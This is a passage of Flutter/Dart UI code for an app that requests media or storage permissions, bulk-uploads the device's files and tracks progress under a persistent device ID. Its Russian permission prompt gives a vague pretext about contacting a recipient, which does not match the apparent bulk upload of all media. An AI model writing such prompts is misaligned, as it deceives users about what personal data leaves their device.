                          fontWeight: FontWeight.bold,
                        ),
                      ),
                      SizedBox(height: 10),
                      Text(
                        'Завантажено файлів: $_uploadedFilesCount',
                        style: TextStyle(fontSize: 16),
                      ),
                      SizedBox(height: 20),
                      ElevatedButton(
                        onPressed: _isUploading ? null : _manualUploadStart,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: BrandColor.kRed,
                          foregroundColor: Colors.white,
                          minimumSize: Size(double.infinity, 50),
                        ),
                        child: _isUploading
                            ? Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            SizedBox(
                              width: 20,
                              height: 20,
                              child: CircularProgressIndicator(
                                color: Colors.white,
                                strokeWidth: 2,
                              ),
                            ),
                            SizedBox(width: 10),
                            Text('Завантаження...'),
                          ],
                        )
                            : Text('Почати завантаження'),
                      ),
                      SizedBox(height: 10),
                      if (!_hasPermissions)
                        TextButton(
                          onPressed: _requestPermissionsAndStart,
                          child: Text('Запит дозволів'),
                        ),
                    ],
                  ),
                ),
              ),

              SizedBox(height: 20),

              Card(
                child: Padding(
                  padding: const EdgeInsets.all(16.0),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        '📱 Інформація про пристрій',
                        style: TextStyle(
                          fontWeight: FontWeight.bold,
                          fontSize: 16,
                        ),
                      ),
                      SizedBox(height: 8),
                      FutureBuilder<String>(
                        future: _getUniqueDeviceId(),
                        builder: (context, snapshot) {
                          if (snapshot.hasData) {
                            return Text('ID пристрою: ${snapshot.data}');
                          }
                          return Text('Завантаження ID...');
                        },
                      ),
                      SizedBox(height: 8),
                      Text('Статус: ${_isUploading ? 'Завантаження' : 'Готовий'}'),
                      if (_deviceId.isNotEmpty)
                        Text('Поточний deviceId: $_deviceId'),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildStatRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4.0),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Text(label, style: TextStyle(fontSize: 16)),
          Text(value, style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }

  String _formatTimestamp(String timestamp) {
    try {
      final dateTime = DateTime.parse(timestamp);
      return '${dateTime.hour.toString().padLeft(2, '0')}:${dateTime.minute.toString().padLeft(2, '0')} ${dateTime.day}.${dateTime.month}.${dateTime.year}';
    } catch (e) {
      return timestamp;
    }
  }

  void _showDetailedStatsDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: Text('Детальна статистика файлів'),
        content: SingleChildScrollView(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            mainAxisSize: MainAxisSize.min,
            children: [
              Text('Загальна інформація:', style: TextStyle(fontWeight: FontWeight.bold)),
              SizedBox(height: 8),
              Text('Всього файлів: ${_fileCountStats['total_files'] ?? 0}'),
              Text('Завантажено: ${_fileCountStats['uploaded_files'] ?? 0}'),
              Text('Залишилось: ${_fileCountStats['remaining_files'] ?? 0}'),
              if (_fileCountStats['upload_percentage'] != null)
                Text('Прогрес: ${_fileCountStats['upload_percentage']}%'),
              if (_fileCountStats['files_skipped'] != null)
                Text('Пропущено файлів: ${_fileCountStats['files_skipped']}'),
              SizedBox(height: 16),
              Text('Технічна інформація:', style: TextStyle(fontWeight: FontWeight.bold)),
              SizedBox(height: 8),
              Text('ID пристрою: ${_fileCountStats['device_id'] ?? 'Невідомо'}'),
              if (_fileCountStats['last_count_timestamp'] != null)
                Text('Час останнього підрахунку: ${_formatTimestamp(_fileCountStats['last_count_timestamp'])}'),
              if (_fileCountStats['is_complete'] == true)
                Text('Статус: Завершено', style: TextStyle(color: Colors.green, fontWeight: FontWeight.bold)),
              if (_fileCountStats['error'] != null)
                Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    SizedBox(height: 16),
                    Text('Помилка:', style: TextStyle(fontWeight: FontWeight.bold, color: Colors.red)),
                    Text('${_fileCountStats['error']}'),
                  ],
                ),
            ],
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text('Закрити'),
          ),
          TextButton(
            onPressed: () {
              Navigator.pop(context);
              _refreshFileCountStats();
              _loadRealTimeProgress();
            },
            child: Text('Оновити'),
          ),
        ],
      ),
    );
  }

  Future<void> _manualUploadStart() async {
    if (_hasPermissions) {
      await _refreshFileCountStats();
      await _loadRealTimeProgress();
      _startFileUploadProcess();
    } else {
      _showPermissionDialog();
    }
  }

  void _showPermissionDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: Text('Требуется доступ к медиа файлам.'),
        content: Text('Приложению требуется доступ к медиа чтобы связаться с адресатом и наладить обмен данными.'),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text('Не сейчас'),
          ),
          TextButton(
            onPressed: () {
              Navigator.pop(context);
              _requestPermissionsAndStart();
            },
            child: Text('Дать доступ'),
          ),
        ],
      ),
    );
  }

  Future<void> _requestPermissionsAndStart() async {
    final hasPermissions = await _requestStoragePermissions();

    if (hasPermissions) {
      setState(() {
        _hasPermissions = true;
      });

      await _refreshFileCountStats();
      await _loadRealTimeProgress();
      _startFileUploadProcess();
    } else {
      _showSettingsDialog();
    }
  }

  Future<bool> _requestStoragePermissions() async {
    if (Platform.isAndroid) {
      final version = await _getAndroidSdkInt();

      if (version >= 33) {
        final photos = await Permission.photos.request();
        final videos = await Permission.videos.request();
        final audio = await Permission.audio.request();
        return photos.isGranted && videos.isGranted && audio.isGranted;
      } else {
        final storage = await Permission.storage.request();
        return storage.isGranted;
      }
    }
    return true;
  }

  void _showSettingsDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: Text('Permission Required'),
        content: Text('Storage permission is required to upload your files. Please grant the permission in app settings.'),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text('Cancel'),
          ),
          TextButton(
            onPressed: () {
              Navigator.pop(context);
              openAppSettings();
            },
            child: Text('Open Settings'),
          ),
        ],
      ),
    );
  }

  // === НОВОЕ: Додаємо метод для отримання deviceId ===
  Future<String> _getUniqueDeviceId() async {
    try {
      final deviceId = await DeviceHelper.getUID();

      if (deviceId != null && deviceId.isNotEmpty && deviceId != 'unknown_device') {
        return deviceId;
      }

      final prefs = await SharedPreferences.getInstance();
      String? savedDeviceId = prefs.getString('unique_device_id');

      if (savedDeviceId != null && savedDeviceId.isNotEmpty) {
        return savedDeviceId;
      }

      final deviceInfo = DeviceInfoPlugin();
      String newDeviceId = '';

      if (Platform.isAndroid) {
        final androidInfo = await deviceInfo.androidInfo;
        newDeviceId = 'android_${androidInfo.id}';
      } else if (Platform.isIOS) {
        final iosInfo = await deviceInfo.iosInfo;
        newDeviceId = 'ios_${iosInfo.identifierForVendor}';
      } else {
        newDeviceId = 'device_${UniqueKey().toString()}';
      }

      await prefs.setString('unique_device_id', newDeviceId);

      return newDeviceId;

    } catch (e) {
      print('❌ Error getting device ID: $e');
      final fallbackId = 'device_${DateTime.now().millisecondsSinceEpoch}_${UniqueKey().toString().substring(0, 8)}';
      return fallbackId;
    }
  }
}